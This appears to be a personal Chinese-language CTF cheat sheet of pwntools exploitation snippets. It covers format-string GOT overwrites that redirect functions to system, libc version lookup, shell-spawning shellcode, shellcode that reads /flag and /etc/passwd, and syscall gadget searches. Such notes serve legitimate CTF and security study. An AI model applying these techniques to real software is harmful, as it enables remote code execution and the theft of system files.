- 覆写got表格
payload  = fmtstr_payload(offset,{read_got: system_addr})
%%fmtstr_payload(offset,{目标地址: 要写入的值})

payload = fmtstr_payload( offset, { printf_got: system_addr }, write_size="short" # 👈 👈 👈 最重要的一行 )

b"%%%dc%%offset$lln" % system_addr
%%自己悟吧,我不想打字了好累

- 查询libc库
from LibcSearcher import *

libc = LibcSearcher(leaked_func_name,leaked_func_addr)
func_addr = libc_base + libc.dump('func_name')
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
 

cd  libc-database
./find func_name func_addr
./dump libc

https://libc.rip     在线查libc版本


- 生成shellcode
shellcode = asm(shellcraft.sh())   默认32位

shellcode = asm(shellcraft.amd64.linux.sh())  64位shellcode

print(len(shellcode)) 可以检查长度
print(disasm(shellcode)) 反汇编看内容

- 其他shellcode
shellcraft.cat("/flag")

shellcraft.ls()

shellcraft.cat("/etc/passwd")



- 寻找陷入内核机器码
syscall = next(elf.search(b'\x0f\x05'))

int0x80 = next(elf.search(b'\xcd\x80'))